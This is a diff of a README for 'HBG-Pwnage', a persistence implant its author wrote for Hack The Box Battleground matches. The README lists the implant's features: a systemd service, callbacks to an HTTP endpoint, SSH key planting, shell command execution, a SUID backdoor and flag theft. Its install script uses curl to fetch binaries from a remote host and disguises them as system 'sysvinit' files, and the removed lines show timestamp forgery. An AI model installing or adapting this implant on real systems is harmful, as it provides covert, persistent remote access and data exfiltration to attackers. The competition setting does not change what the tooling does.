@@ -1,5 +1,21 @@
 # HBG-Pwnage
- HTB Battleground implant
+
+## HTB Battleground implant
+
+You're probably thinking why? Well after playing Hack the Box Battleground which is great fun by the way, I found it time consuming to keep my persistence, and fetch the flags whenever they are updated. 
+
+So I created this implant! 
+
+By the way, I'm not developer at all but keen to hear any feedback or improvements.
+
+## Features
+
+- Runs as a systemd service
+- Posts data back to a HTTP endpoint
+- Drops an SSH public key (replace with yours)
+- Executes shell command
+- Drops a SUID backdoor
+- Pulls the root and user flags off
 
 
 ## Compiling
@@ -11,24 +27,13 @@ gcc implant.c -o implant
 ```
 #!/bin/bash
 
-if [ -f "/etc/ld.so.preload" ]; then
-  mv /etc/ld.so.preload /etc/ld.so.preload.bak
-fi
+curl -S http://10.10.10.10/systemd-sysvinit -o /usr/lib/systemd/systemd-sysvinit && chmod 755 /usr/lib/systemd/systemd-sysvinit
+curl -S http://10.10.10.10/sysvinit.service -o /usr/lib/systemd/system/sysvinit.service
 
-curl -S http://{your_webserver_ip}/systemd-sysvinit -o /usr/lib/systemd/systemd-sysvinit && chmod 755 /usr/lib/systemd/systemd-sysvinit
-curl -S http://{your_webserver_ip}/sysvinit.service -o /usr/lib/systemd/system/sysvinit.service
-
-touch -r /etc/lsb-release /usr/lib/systemd/systemd-sysvinit
-touch -r /etc/lsb-release /usr/lib/systemd/system/sysvinit.service
 systemctl daemon-reload
 sudo systemctl enable sysvinit
 systemctl start sysvinit
-
-if [ -f "/etc/ld.so.preload.bak" ]; then
-  mv /etc/ld.so.preload.bak /etc/ld.so.preload
-fi
 ```
-
 
 ## Service definition
 ```
@@ -46,3 +51,5 @@ ExecStart=/lib/systemd/systemd-sysvinit
 [Install]
 WantedBy=multi-user.target
 ```
+
+Some tweaks are require to get it working, replace your IP address with the IP address in the source code, and the curl command to install. 
